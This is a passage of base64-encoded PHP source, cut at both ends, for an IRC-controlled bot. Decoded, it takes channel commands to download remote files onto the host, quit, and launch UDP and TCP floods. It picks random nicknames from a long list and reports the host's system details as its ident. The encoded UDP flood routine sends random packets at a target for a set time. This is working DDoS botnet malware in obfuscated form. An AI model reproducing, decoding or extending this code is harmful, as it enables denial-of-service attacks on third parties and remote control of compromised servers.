k8PWNvdW50KCRnZXQpOyRpKyspIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZndyaXRlKCRmcCwkZ2V0WyRpXSk7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnByaXZtc2coJHRoaXMtPmNvbmZpZ1snY2hhbiddLCJbZG93bmxvYWQ6XQMxNCBCZXN0YW5kIFwyIi4kbWNtZFsxXS4iXDIgZ2Vkb3dubG9hZCBuYWFyIFwyIi4kbWNtZFsyXS4iXDIiKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmY2xvc2UoJGZwKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7ICR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW2Rvd25sb2FkOl0DMTQgVHlwIFwiLmRvd25sb2FkIGh0dHA6Ly95b3VyLmhvc3QvZmlsZSAvdG1wL2ZpbGVcIiIpOyB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KCQkJCQkJCQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgImRpZSI6IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICR0aGlzLT5zZW5kKCJRVUlUIDpkaWUgY29tbWFuZCBmcm9tICRuaWNrIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZmNsb3NlKCR0aGlzLT5jb25uKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdDsgDQoJCQkJCQkJICAgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAibG9nb3V0IjogDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPmxvZ19vdXQoJGhvc3QpOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIlthdXRoOl0DMTQgSmUgYmVudCBudSB1aXRnZWxvZ3QgJG5pY2siKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7IA0KCQkJCQkJCQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgInVkcGZsb29kIjogDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoY291bnQoJG1jbWQpPjMpIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJHRoaXMtPnVkcGZsb29kKCRtY21kWzFdLCRtY21kWzJdLCRtY21kWzNdKTsgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsgDQoJCQkJCQkJDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSAidGNwZmxvb2QiOiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZihjb3VudCgkbWNtZCk+NSkgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgeyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+dGNwZmxvb2QoJG1jbWRbMV0sJG1jbWRbMl0sJG1jbWRbM10sJG1jbWRbNF0sJG1jbWRbNV0pOyANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOyANCiAgICAgICAgICAgICAgICAgICAgICAgICB9IA0KICAgICAgICAgICAgICAgICAgICAgIH0gDQogICAgICAgICAgICAgICAgICAgfSANCiAgICAgICAgICAgICAgICBicmVhazsgDQogICAgICAgICAgICAgfSANCiAgICAgICAgICB9IA0KICAgICAgIH0gDQogICAgICAgJG9sZF9idWYgPSAkdGhpcy0+YnVmOyANCiAgICB9IA0KICAgICR0aGlzLT5zdGFydCgpOyANCiB9IA0KIGZ1bmN0aW9uIHNlbmQoJG1zZykgDQogeyANCiAgICBmd3JpdGUoJHRoaXMtPmNvbm4sIiRtc2dcclxuIik7IA0KDQogfSANCiBmdW5jdGlvbiBqb2luKCRjaGFuLCRrZXk9TlVMTCkgDQogeyANCiAgICAkdGhpcy0+c2VuZCgiSk9JTiAkY2hhbiAka2V5Iik7IA0KIH0gDQogZnVuY3Rpb24gcHJpdm1zZygkdG8sJG1zZykNCiB7DQogICAgJHRoaXMtPnNlbmQoIlBSSVZNU0cgJHRvIDokbXNnIik7DQogfQ0KIGZ1bmN0aW9uIG5vdGljZSgkdG8sJG1zZykNCiB7DQogICAgJHRoaXMtPnNlbmQoIk5PVElDRSAkdG8gOiRtc2ciKTsNCiB9DQogZnVuY3Rpb24gaXNfbG9nZ2VkX2luKCRob3N0KSANCiB7IA0KICAgIGlmKGlzc2V0KCR0aGlzLT51c2Vyc1skaG9zdF0pKSANCiAgICAgICByZXR1cm4gMTsgDQogICAgZWxzZSANCiAgICAgICByZXR1cm4gMDsgDQogfSANCiBmdW5jdGlvbiBsb2dfaW4oJGhvc3QpIA0KIHsgDQogICAgJHRoaXMtPnVzZXJzWyRob3N0XSA9IHRydWU7IA0KIH0gDQogZnVuY3Rpb24gbG9nX291dCgkaG9zdCkgDQogeyANCiAgICB1bnNldCgkdGhpcy0+dXNlcnNbJGhvc3RdKTsgDQogfSANCg0KIGZ1bmN0aW9uIHNldF9uaWNrKCkgew0KDQokcXVlcnltPWFycmF5KA0KIj8iLCAiISIsICJeXiIsICIgXl4iLCAiIDooIiwiIDopIiwgIiB+Oj4iLCAiIDpQfiIsICIgOkQiLCAiLiIsICJhIiwgImkiLCAidSIsICJlIiwgIm8iLA0KInoiLCAidiIsICJ6IiwgIngiLCAiYyIsICJwIiwgIm0iLCAidCIsICJrIiwgImIiLCAicyIsICJ1IiwgImJvdCIsICJnIiwgImxvIiwgImpvIiwgImxvbCINCik7DQokdHN1MT1hcnJheSgiYCIsInwiLCJbIiwiXSIsInsiLCJ9IiwiXiIsIl8iKTsNCiR0c3UyPWFycmF5KCJgIiwifCIsIlsiLCJdIiwieyIsIn0iLCJeIiwiLSIsIlxcIiwiXyIpOw0KJG5pY2t5PWFycmF5KCJ0cm9qYW4iLCAia2VzYXNhciIsICJrd2F0cm9rX3B3b2wiLCAiQ29fUGxlTmdFaCIsICJzYW5nfGZhamFyIiwgIlttZW50YXJpXSIsICJJbnZpdGVyfGd1YXJEIiwgIlRfVGBiYG9MIiwNCgkJCSJDZV9wbGVuZ2VIIiwgIkNlX1BFTiIsICJDZV9DaEFfcEVfZEUiLCAiU3RFcCIsICJ0YW1hX2ZzIiwgImF1dGh8Ym90IiwgIlRfVHxvZmYiLCAiXk1vVXNFXiIsICJzb2xpa2luXl9eIiwNCgkJCSJLZVBlbmRldCIsICJhc2JhayIsICJjZV9tYXQiLCAiY29fc2VkaWgiLCAiaW52aXRlcl9vbmxpbmUiLCAibWFuaWFjfGNoYXQiLCAifHdvcm18IiwgImR1a3VuX2NhYnVsIiwNCgkJCSJicm9udG9rIiwgInBlbXVsdW5nfG9mZiIsICJbXVtdW10iLCAiW2hdW2FdbltddFtddVtdIiwgInRlbWFuX2FwYV90ZW1hbiIsICJjb19zZXRyZXNzIiwgIkF2YXNUIiwgIlNoYVJhaCIsDQoJCQkia2FjYW5nX2thY2FuZyIsICJpbnZpdGVyX2Nvb2wiLCAiYWhtYXR8cGxlbmdlaCIsICJzYW5nX2Rld2EiLCAic2FwYV9tYXVfIiwgIm1hdGlfYWphIiwgIkNqRHciLCAidDRrMjUxfG9GZiIsDQoJCQkiRGVTdG9SeWVEIiwgImNvYm9rIiwgInN0YW5sZXkiLCAic2VsYU1FVCIsICJHYW5kb3MiLCAidG9tbXBlbCIsICJib2JveSIsICJmYWhtaSIsICJ0YW1hIiwgImZsb29kZXIiLCAiRGVTU1MxIiwNCgkJCSJMZW5EdSIsICJtb255b25LIiwgImt3YXRyb2siLCAiQWRtaW5fd2ViIiwgIkFkbWluX3Nwb29mIiwgImludml0ZXIiLCAiQWRtaW5fc2VydmVyIiwgIkFkbWluX3NlcnZlcjEiLCAibGlgbnUiLA0KCQkJIkt1YW18T0ZGIiwgIkJvYnVrLW1hbml6IiwgImw0dDRuZyIsICJLcnNuYW5ldC1DcmV3MSIsICJLcnNuYW5ldC1DcmV3MiIsICJLcnNuYW5ldC1DcmV3MyIsICJLcnNuYW5ldC1DcmV3NCIsDQoJCQkibTE0IiwgImc0ajNMIiwgInIxazQtY3V0ZSIsICJwKipoLWN1dGUiLCAicjRpaC1tYW5pZXoiLCAidjNvX0prdCIsICJrNDR3YW5nMSIsICJKMDAtblQwbDMiLCAiS3VhbW9uIiwgIm15b2ZmIiwNCgkJCSJsNHRyMS1HRyIsICJyZW5hIiwgImJpLTM2YiIsICJSRXl0YSIsICJSRWEtY3V0ZSIsICJzaG5hIiwgInNodGEiLCAiemhsZSIsICJCbGNrX2hPbDMiLCAidDExNG4iLCAiZjQxNG4iLA0KCQkJImNlX2NyeV9jb3dvIiwgImNvd29fY2FyeV9jZXciLCAibmFuYW5hbmFuYSIsICJ0dXR1dHV0dXQiLCAiY2V3X2FqYWhhbiIsICJjb19waWxvdCIsICJjb19kb2t0ZXIxIiwgImNvX2d1cnUyIiwNCgkJCSJjb190YWtlc2kiLCAiY29fcG9saXNpNCIsICJjb190ZW50YXJhNSIsICJjb19zYWxvbiIsICJjb19iYW5jaSIsICJjZXdfc3VrYV9jZXciLCAidWphbmdzIiwgInVudHVuZyIsDQoJCQkiY29faW5naW5fbWxsbGwxIiwgImNvX2phbWJpX2theWEiLCAiY29fcHJlc2lkZW5fcmkiLCAiY29fcGVuYWhhbl9uYWZzdSIsICJjb19rYXlha2EiLCAiY29fbm9ybWFsNiIsDQoJCQkiY29vb29vb29vNyIsICJuY29vb29vbzgiLCAiY2V3ZVhzIiwgImNld2Vrenp6IiwgImNld2Vrc3N6enp6eiIsICJjZV9fX2NlIiwgImNoYWNoYSIsICJjaGljaGlfIiwgImFyZGlhbmFuIiwNCgkJCSJjZV9wdXRpaF9tYW5pcyIsICJjZXdlMjEiLCAiY2Vfa3VsaWFoYW5fYXEiLCAiY2Vfc2tvbGFoYWhuIiwgImNlX21hbWEiLCAibWFtYV9wdXRyaXkxIiwgInB1dHlfY2F5YW5rIiwNCgkJCSJ0YWtlc2lbcHV0cnldIiwgIm1hbHVrdSIsICJjZXdlX3NpZG9hcmpvbyIsICJtYW5pY19mcyIsICJjZXdla3p6el9mcyIsICJjb3dva3pfZnMiLCAiamFkaV9jZSIsICJ3b3dvayIsDQoJCQkibmFuYW5hIiwgIm5hbmlfZnMiLCAic3VnaWt6X2ZzIiwgIm5vdGVwYWsiLCAieWFtYWhhNSIsICJzdXp1a2k3NiIsICJjby1saW1pdGVkYm90dGVyNzciLCAiY2UtbGltaXRlZGJvdHRlcjc4IiwNCgkJCSJjb3dlLWxpbWl0ZWRib3R0ZXI3OSIsICJjb3dvLWxpbWl0ZWRib3R0ZXI4MCIsICJ3ZS1saW1pdGVkYm90dGVyODEiLCAibm9fc3VidSIsICJuby1uYXJrb2JhIiwgImNlX3N1a2FfbmFya29iYSIsDQoJCQkiY2Vfc3VrYV9hbGxrb2hvbCIsICJjb19zdWthX21hYnVrPyIsICJjb19pc2xhbT8iLCAiYzBfa2F5YV9hamFoIiwgImNvX21vYmlsX3NlZGFuIiwgImNvX3NlbXBha3p6enoiLCAiYzNfMyIsICANCgkJCSJjZV9tb3RpZVoiLCAiW05vYmxlbWFuXSIsICJCbGFja19UeXJhbm8iLCAiY2VfbWFueXVuIiwgImplbWJ1VGkiLCAiVHlyYW4tRHJhZ29uIiwgIm5pYV9ib2JvIiwgIltGbGluVF0iLCANCgkJCSJNZXRhTC1EcmFnb24iLCAiYXByaWxfbG92ZSIsICJWaWNTaU5nIiwgIkZpcmUtRHJhZ29uIiwgInZhcmFfIiwgIlRoZS1BYnlzcyIsICJCcmFpbl5KYWNrZXIiLCAiQXJiaWEiLA0KCQkJIldDaVpjbyIsICJHaXJlUGFuZGEiLCAidmlsYV9tYW5qYSIsICJCdUdpZUwiLCAiR2lhcmFkb3MiLCAiW1JdZWNbbyIsICJ7TWV0YWxtb3JwaH0iLCAiRHJhdGluaSIsICJeS2lMTFteIiwNCgkJCSJ7TmVlZGxlX1dhbGx9IiwgIkRyYWdvbml0ZSIsICJkaWV0YV9jdXRlIiwgIntYdU1ibGllUn0iLCAiRHJhZ29uYWlyIiwgIltNQ1tSXSIsICJNcl9QYXRla3VsIiwgIkRvZy1NYXJsaSIsDQoJCQkiRXhpbGUtRm9yY1tlIiwgIltSZS1GdXNpb25dIiwgIkZpZW5kLURhcmtuZXNzIiwgIl94WHhbXyIsICJLYXJ0dUFTIiwgIlJlcHRpbGUtTGl6YXJkIiwgIm1lbGFfY2FlbSIsDQoJCQkiW0pdYWd1bmciLCAiV2hpdGUtTWFnaWNpYW4iLCAia29tcG9yfG1vYmFbbCIsICJ7S2lyb3JvfSIsICJZLURyYWdvbiIsICJET3h0cmlbbiIsICJbWV11W1NddCIsICJBcm1vcl5FWEUiLA0KCQkJIkRSQUdPTi1bWF0iLCAiRy1EYW5rIiwgIlJvY2tfTW9uYXJjaCIsICJBeWllbWJhIiwgIltMYXN0LVdpbGxdIiwgIlBpb25lZXItQmFnZSIsICJ6SUdHeVtfIiwgIltCb3NzLVJ1c2hdIiwNCgkJCSJDaGFpbmBTbGF5ZXIiLCAiV2hpVGVfRmxhR3MiLCAiW1Jpcnlva3VdIiwgIkZsYW1pbmdgSEl0YSIsICJHdWFSZC1uRW1vIiwgIk1yc19BbXBlcmUiLCAiSXJvbi1LbmlnaHQiLA0KCQkJImluRGlhbjQiLCAiRS1DaG9eZSIsICJCdXJnbGFycyIsICJSaUhhbk5hIiwgIltTXWhpbmljaGkiLCAiRWxlbWVudC1EcmFnb24iLCAiRkFMWnpBW05dIiwgIkphcm9zXkpyIiwNCgkJCSJEYXJrLVNpbHZhIiwgIkFscGhhTiIsICJbSGVsbC1BbGxpYW5jZV0iLCAiW0RdSGVyby1EZXZpTEd1eSIsICJCZXRhXk1hZ25lW3RdIiwgIltGZWF0aGVyLVNob3RdIiwNCgkJCSJSb3lhbC1LbmlnaHQiLCAiTmVvXkFxdVthXSIsICJbTGlnaHRlbl0iLCAiRGFyay1CdWxhdSIsICJHYXJuZWMiLCAiam9nbGluZyIsICJNZXRlbyIsICJzcHlCaVR6IiwgImMzX2FqYWhhIiwNCgkJCSJbRGFyay1Xb3JsZF0iLCAiR3VhcmRpYW4tR3JhcmwiLCAia2VpcnlubmEiLCAiR3VhUmQtU2F1cnVzIiwgIkluc2VjdC1Tb2xkaWVyIiwgIm1lZGl0YXJpYSIsICJ7SGVyby1TaWduYWx9IiwNCgkJCSJDYXRhUHVsVGVyIiwgIk5pbmFhWiIsICJQeXJhbWlkLVR1cnRsZSIsICJCYXJyaWVyLURyYWdvbiIsICJNYWlkZVtuXSIsICJGbGFyZWBEcmFnb24iLCAiW0RdSGVyby1Eb2xlZEd1eSIsDQoJCQkiQW1hem9uLSIsICJzS2lpTiIsICJTa3VsbF5BbGllbiIsICJUUk9VQkxFWy0iLCAiW0hhbW1lci1TaG90XSIsICJaZXJhdG8iLCAiQkFIQU1VVGUiLCAia0FMcGlpTiIsICJDaGlyb24iLA0KCQkJIl5JRlJJVFNeIiwgIlNpbHBoZWVkIiwgIkd1YVJkTmV0aWMiLCAiTkFSVE9fWFhYIiwgIlJvY2tldC1KdW1wZXIiLCAiSW5mZXJuYWxRdWVlbiIsICJHdWFSZC1LaWdodCIsDQoJCQkiTW90aGVyLUdyaXp6bHkiLCAiUGVudW1icmFsIiwgIkdSRUdBUnoiLCAiW1NhbHZhZ2VdIiwgIkNvYnJhLU1hbiIsICJDeWJvcmtgbmVvIiwgIkdpZ2FudGVzIiwgIkRhcmstR29sZG8iLA0KCQkJIk1paGF3ayIsICJSeXVraWkiLCAiRGVlcFNlYS1XYXJyaW9yIiwgIkRgQWNlIiwgIk9qYW1hLUJsYWNrIiwgIlNFcnBlbnRpbmUiLCAiQ2ludG9uRyIsICJIb3J1c2BTZXJ2YW50IiwNCgkJCSJGbGFzaGBBc3NhaWxhbnQiLCAiRGBEcmFnb24iLCAie1plcm8tR3Jhdml0eX0iLCAiQXVzc2EiLCAiRGBUYWNoIiwgImRqYW1icjN0IiwgIk11Y3VzLVlvbGsiLCAiRGBHcmFwIiwNCgkJCSJ7R3Jhdml0eS1CaW5kfSIsICJDYW5ub25Ib2xkZXIiLCAiRGBSb2dlciIsICJHYWxlX0xpemFyZCIsICJJbnRlcmNlcHRvci1DYW5ub24iLCAiR3VhcmRpYW5eU3BpblgiLA0KCQkJIkZlbnJpciIsICJBbWF6b25lc3MtUGFsYWRpbiIsICJKRVRTRVRFUl8iLCAie1RyYXAtSmFtbWVyfSIsICJNYXJpb25ldHRlIiwgIlNISVZBYCIsICJNb2JpdXMtTW9uYXJjaCIsDQoJCQkiS2F5YGVzdCIsICJbQmFzc10iLCAic3F1aXJkYHdvcmQiLCAiWC1IZWFkLUNhbm5vbiIsICJDQXJlbGlOIiwgIkNob3BtYW5gT3V0bGF3IiwgIkthbmdhcm9vIiwgIkFjY2VsZXJhdG9yIiwNCgkJCSJSeXUtUmFuIiwgIkZ1aGlgTm9gVG9yaSIsICJEYXJrLUhhZGVzIiwgIk1vbHRlbl9ab21iaWUiLCAiRF5EXlN1cnZpdm9yIiwgIkZpcmUtU3Ryb20iLCAiW0NoYW9zLUVuZF0iLA0KCQkJIlByaW5jZXNzLUt1bGFuIiwgIlJhZGVvbl4iLCAiTWFza2VkLURyYWdvbiIsICJMYWBKaW5nIiwgIkN5Ym9yW1hdIiwgIntTa2lsLURyYWlufSIsICJCYXR0bGUtT1giLCAiWm9ycm9gIiwNCgkJCSJ7R29yZ29uc2BFeWV9IiwgIldhcnNoaXAtVGV0cmFuIiwgInJpcmluZSIsICJEZXNgTGFjb29kYSIsICJbRV1IZXJvLVNwYXJrbWFuIiwgIltOZXRCdXNdIiwgInRvbmdgc2FtYGNob25nIiwNCgkJCSJHcmF2ZS1PSGphIiwgIlN1YlNFdmVuIiwgIkJ5c2VyLVNob2NrIiwgIkVib24tTWFnaWNpYW4iLCAiU0t5Wk9uRVswMl0iLCAiW0VdSGVyby1XaWxkTWFuIiwgIlByaW5jZXNzLVRzdXJ1Z2kiLA0KCQkJIk9QVElYc2AiLCAiSGVyb19LaWRzIiwgIkRhcmstRHVzdC1TcGlyaXQiLCAiR29sZW0tIiwgIkRhckstQmFsdGVyIiwgIkNyaW9zcGhpblgiLCAiQVFVQS1ORU9TIiwgImF6aXpgZ2FnYXAiLA0KCQkJIltEXUhlcm8tRG91YmxlR3V5IiwgIkRvcmlhZG8iLCAie1NvbGFyLVJheX0iLCAiQmlyZGZhY2UiLCAiUGhvZW5pWF1bIiwgInRoaWVuZ19mZW5HIiwgIkZ1c2hpb2hgUmljaGllIiwNCgkJCSJQaWtlcnVgIiwgIk1yXlZvbGNhbm8iLCAiTW9ycGhpbmctSkFSIiwgIlNdW0UiLCAiRmVyYWwtSW1wIiwgIkRpY2UtSkFSIiwgIlJBSUdFS0leIiwgIkplbGx5RmlzaCIsDQoJCQkiR3VhUmQtSkFSIiwgIltSXVtBXSIsICJZb21pLVNoaXAiLCAiSEVYLVNlYWxlZCIsICJkZXdpUSIsICJHYW1tYV5NYWduZXQiLCAiU2NhcmFicyIsICJERXNvbGF0ZXwiLA0KCQkJIlRlcnJhZm9ybWluZyIsICJEZXNyb29rIiwgIk1hamVzVGljIiwgIkdyZXZlS2VlcGVyc2BHdWFyZCIsICJMb2N1c3RzIiwgIkNyZVdsaXNUIiwgIkZhaXJ5XkxpbHkiLA0KCQkJIkZpYmVyLUpBUiIsICJZYW1hdGFbRF0iLCAiTnlhbi1OeWFuIiwgIlRlcnJvcmtpbmciLCAiT2phbWEtS0lORyIsICJzd2FubGl1IiwgIkxhcnZhZS1Nb3RoIiwgIltFLUhFUk9dIiwNCgkJCSJEYXJrXkplcm9pZCIsICJWLVRpZ2VyLUpldCIsICJbR0VORVJBTF0iLCAiRGFyay1TY29ycGlvbiIsICJHYWlhLVNPdWwiLCAiU29yY2VzZXJeIiwgIlVsdGltYXRlLUluc2VjdCIsDQoJCQkiTWFpZGVuLUFxdWEiLCAiQWlyS25pZ2h0IiwgIkplcnJ5LUJlYW5zIiwgIkd1YXJkaWFuLUNlYWwiLCAiVXJpYSIsICJob3Vyc3dpbiIsICJHdWFSZC1HaXJhZmZlIiwNCgkJCSJEeU5hTWljYSIsICJLYWd1LVRzdWNoaSIsICJHeW1uYXN0aWNzIiwgIkdhclplVFQiLCAid2lsbHlmdWxsIiwgIkdhbmdpci1CZWFzdCIsICJTYWt1WlldWyIsICJodWFuZ19saVUiLA0KCQkJIkFtcGhpYmlhbiIsICJCZWhlbW90aGAiLCAiY2VgY2EiLCAiSmFja2BzLUtuaWd0IiwgIkluVmVSTm9dWyIsICJUYWxXYXIiLCAiUXVlZW5gcy1LbmlndCIsICJiMDBNZXIiLA0KCQkJIkhpdG90c3UiLCAiS2luZ2BzLUtuaWdodCIsICJbU0VyVkFOVF0iLCAiQ2hhb3MtZ3VhcmQiLCAiRGV2aUwtTWFudGEiLCAiSElEUk9HRURPTiIsICJBbWF6b25lc3MiLCAiQmF6b28iLA0KCQkJIlBIQU5UT00tWCIsICJFVG9sbC1HdWFSZCIsICJTb3VsLVRpZ2VyIiwgIktPSklLT0NZIiwgIldZTk4iLCAiQ3ljb2lkIiwgIldhdEVSeiIsICJ7TmVlZGxlLVdhbGx9IiwNCgkJCSJQeXJhbWlkYFR1cnRsZSIsICJEdW5IaUwiLCAie1JhaWdla2ktQnJlYWt9IiwgIlNwZWFyLURyYWdvbiIsICJNYXJsYm9ybyIsICJhbnRpYGRlc3R5bmkiLCAiRGFya2BFTEYiLA0KCQkJIkFTdGVySUtzIiwgIkJ1YmJsZS13ZWtzIiwgIltNaWxsZW5uaXVtXSIsICJCYWxsZXJpYSIsICJSeXUtS2lzaGluIiwgIlRodW5kZXItRHJhZ29uIiwgIlNhbXVyYWleTWFuIiwNCgkJCSJub3RoaW5rYHMiLCAiV2F0ZXItRHJhZ29uIiwgIlNIQUJUSSIsICJLdXJvZ2FuZSIsICJaLU1ldGFsLVRhbmsiLCAiT0pBTUEtS2luZyIsICJEYXJrLUhFWCIsICJbWWFtaV0iLA0KCQkJIk9ncmVlIiwgInNtYXJ0ZXIiLCAiRGVzdHJveWVyYHMiLCAiT0tSRXgiLCAiZ29kYGhhbmQiLCAiR3VhcmRpYW4tRWxtYSIsICJTSE9USE8iLCAiS0luZ2BEZW1pcyIsDQoJCQkiSnVyYXNzaWMtRWdnIiwgIkFDRENbXSIsICJeTmlnaHRNYXJlXiIsICJCcmVha2VyLVdhcnJpb3IiLCAiRGFuZ2dsZW0iLCAic2hhZ2d5YGRvZyIsICJNb2lzdHVyZSIsDQoJCQkiRUxUT1ItRWx2b3IiLCAiQmxhY2stRm9yZXN0IiwgIlJldml2YWwtSmFtIiwgIlJhWU1BTi1Cb3lzIiwgIkRlc15Xb21iYXQiLCAiU29pdHN1IiwgIkIweXMiLA0KCQkJIlJlYm9ybl5ab21iaWUiLCAiS2Fpc2VyLURyYWdvbiIsICJPbGFrLWFsdW5nIiwgImtpbmdkb21gb2ZgaGVhdmVuIiwgIlJlc2N1ZS1DYXQiLCAiXkVNUFRZXiIsDQoJCQkiRHJhZ29uLUV4YWxpb24iLCAiRXJyaWEiLCAiW1NIaV0iLCAiRF5EXlRyYWluZXIiLCAiREVDT1JPSUQiLCAiRmlza2FOIiwgIlRob3VzYW5kLURyYWdvbiIsICJLdXdhZ2F0YSIsDQoJCQkib19MaXZpYSIsICJTbGltZSIsICJBbXBoaWJpb3VzYE1LLTMiLCAiRWxvX2lEenMiLCAiV2l0dHktUGhhbnRvbSIsICJGb290YmFsbGVyIiwgIkdFQVItQkVBU3QiLA0KCQkJIkNhdGFib2xpc20iLCAiRGFyay1TdGVnbyIsICJLYXpLdXoiLCAiR3JhdmVyb2JiZXIiLCAiRHVtbXktR29sZW0iLCAiWm9yYyIsICJNYWdpYy1Cb3giLCAiRG9scGhpbmEiLA0KCQkJIl5ERU1JU14iLCAiQmlja3VyaWJveCIsICJHQUdBR0lHT0dBIiwgIkFudWJpc3MiLCAiVGFib28iLCAiW0VdSGVyby1DbGF5bWFuIiwgIkdpbGZlciIsICJLYW1pbm90ZSIsDQoJCQkiRGFyay1CbGFkZSIsICJScEdfTHoiLCAiQWNrb2JhdF9Nb25rZXkiLCAiVXNoaW9uaSIsICJMZWF2ZWBNZSIsICJMaXphcmRgV2FycmlvciIsICJTaWxlbnRgU3dvcmRzbWFuIiwNCgkJCSJNYW1tb3RoIiwgIlByZXZlbnRgUmF0IiwgIkRvZ2BNYXJyb24iLCAiTWFtbW90aGAiLCAiS3lvbnNoZWUiLCAiQW1idXJvaWQiLCAiW1RIRV1bR3V5XSIsIlRIRV1fW0VORCIsIA0KCQkJIkZsYW1lYENlcmVicnVzIiwgIk1hbi1FYXRlcmBCdWciLCAiaFl1TmEiLCAiWnVsdSIsICJPZ3JlZS1Hcm9UVG8iLCAiSElEUk9OW0gyT10iLCAiTWFuLVUxIik7DQoJCQkNCiAgJHRoaXMtPm5pY2sgPSAkbmlja3lbcmFuZCgwLGNvdW50KCRuaWNreSkgLSAxKV07DQoNCiAgICAjJHRoaXMtPm5pY2sgLj0gJHRoaXMtPmNvbmZpZ1sncHJlZml4J107IA0KICAgIGZvcigkaT0wOyRpPCR0aGlzLT5jb25maWdbJ21heHJhbmQnXTskaSsrKSANCiAgICAgICMgJHRoaXMtPm5pY2sgLj0gbXRfcmFuZCgwLDkpOyANCiAgICAkdGhpcy0+c2VuZCgiTklDSyBbIi5yYW5kKDEwMCwgOTk5OSkuIl0iLiR0aGlzLT5uaWNrKTsNCiB9IA0KIA0KICBmdW5jdGlvbiBzZXRfaWRlbnQoKSB7DQogIA0KICAkcHJpZnk9YXJyYXkoIlN0RXAiLCAiQ2pEdyIsICJhc2JhayIsICJjb2JvayIsICJBdmFzVCIsICJbXVtdW10iLCAiY2VfbWF0IiwgInx3b3JtfCIsICJDZS1QRU4iLCAidGVtYW4tYXAiLCANCgkJCSJ0cm9qYW4iLCAidDRrMjUxIiwgIm9ubGluZSIsICJtYW5pYWMiLCAicGVtdWx1IiwgInRhbWEtZnMiLCAiVC1UfG9mZiIsICJicm9udG9rIiwgImthY2FuZy1rIiwgDQoJCQkic2V0cmVzcyIsICJeTW9Vc0VeIiwgIkRlU3RvUnkiLCAic3RhbmxleSIsICJzZWxhTUVUIiwgImtlc2FzYXJyIiwgImt3YXRyb2stIiwgInNhbmctZGV3IiwgDQoJCQkiUGxlTmdFaGwiLCAic2FuZ3xmYWoiLCAiW21lbmFyaV0iLCAiSW52aXRlcnwiLCAiVF9UYGJgb0wiLCAiYXV0aC1ib3QiLCAiS2VQZW5kZXQiLCAiW110W111W10iLCANCgkJCSJjb19zZWRpaCIsICJtYXRpX2FqYSIsICJDZV9wbGVuZyIsICJDZV9DaEFfcCIsICJzYXBhLW1hdSIsICJkdWt1bi1jYSIsICJsaWtpbmdnZyIpOyANCgkJCQ0KICAkaWRlbnQgPSAkcHJpZnlbcmFuZCgwLGNvdW50KCRwcmlmeSkgLSAxKV07DQogIA0KICAkdGhpcy0+c2VuZCgiVVNFUiAiLiRpZGVudC4iIDEyNy4wLjAuMSBsb2NhbGhvc3QgOiIucGhwX3VuYW1lKCkuIiIpOw0KICB9DQoNCiAgZnVuY3Rpb24gdWRwZmxvb2QoJGhvc3QsJHBhY2tldHNpemUsJHRpbWUpIHsNCgkkdGhpcy0+cHJpdm1zZygkdGhpcy0+Y29uZmlnWydjaGFuJ10sIltcMlVkcEZsb29kIFN0YXJ0ZWQhXDJdIik7IA0KCSRwYWNrZXQgPSAiIjsNCglmb3IoJGk9MDskaTwkcGFja2V0c2l6ZTskaSsrKSB7ICRwYWNrZXQgLj0gY2hyKG10X3JhbmQoMSwyNTYpKTsgfQ0KCSR0aW1laSA9IHRpbWUoKTsNCgkkaSA9IDA7DQoJd2hpbGUodGltZSgpLSR0aW1laSA8ICR0aW1lKSB7DQoJCSRmcD1mc29ja29wZW4oInVkcDovLyIuJGhvc3QsbXRfcmFuZCgwLDYwMDApLCRlLCRzLDUpOw0KICAgICAgCWZ3cml0ZSgkZnAsJHBhY2tldCk7DQogICAgICAgCWZjbG9zZSgkZnApOw0KCQkkaSsrOw0KCX0NCgkkZW52ID0gJGkgKiAkcGFja2V0c2l6ZTsNCgkkZW52ID0gJGVudiAvIDEwNDg1NzY7DQoJJHZlbCA9ICRlbnYgLyAkdGltZTsNCgkkdmVsID0gcm91bmQoJHZlbCk7DQoJJGVudiA9IHJvdW5kKCRlbnYpOw0KCSR0aGlzLT5wcml2bXNnKCR0aGlzLT5jb25maWdbJ2NoYW4nXSwiW1wyVWRwRmxvb2QgRmluaXNoZWQhXDJdOiAkZW52IE1CIGVudmlhZG9zIC8gTWVkaWE6ICR2ZWwgTUIvcyAiKTsNCn0NCiBmdW5jdGlvbiB0Y3BmbG9vZCgkaG9zdCwkcGFja2V0cywkcGFja2V0c2l6ZSw